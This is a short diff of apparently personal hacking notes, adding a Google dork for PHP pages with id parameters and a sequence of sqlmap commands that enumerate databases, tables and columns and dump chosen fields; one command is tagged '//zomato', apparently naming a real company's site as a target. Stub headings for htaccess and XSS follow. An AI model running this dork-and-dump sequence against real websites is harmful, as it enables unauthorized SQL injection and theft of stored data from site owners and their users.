@@ -20,6 +20,13 @@ C:192-223
 	127.0.0.0 					(For internal checking NIC)
 
 Google Dorks
-inurl:php?id=1
+inurl:.php?id=1
 
-sqlmap -u URL dbs
+sqlmap -u URL --dbs //zomato
+sqlmap -u URL -D <db> --tables
+		-T <tab> --columns
+		 -C <field, field> --dump'
+
+
+htaccess
+	xss
